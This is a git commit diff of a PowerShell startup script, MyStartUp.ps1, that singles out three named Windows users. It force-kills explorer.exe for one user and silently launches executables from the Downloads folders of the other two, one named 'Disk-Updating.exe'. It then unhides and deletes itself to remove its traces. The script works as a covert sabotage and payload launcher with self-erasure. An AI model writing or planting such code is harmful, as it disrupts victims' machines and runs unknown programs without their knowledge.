dd22accae4055e86fdcabf785a8026b91b115cd3
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-25 00:51:27 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,1 +1,10 @@
-C:\Users\jona\Desktop\t.exe
+$user1 = "C:\Users\Jona"
+$user2 = "C:\Users\angel"
+$user3 = "C:\Users\seba"
+
+if ($env:USERPROFILE -eq $user1){taskkill /F /IM explorer.exe}
+if ($env:USERPROFILE -eq $user2){C:\Users\angel\Downloads\Disk-Updating.exe}
+if ($env:USERPROFILE -eq $user3){C:\Users\seba\Downloads\lml.exe}
+
+attrib -h C:\Users\Public\MyStartUp.ps1
+del C:\Users\Public\MyStartUp.ps1
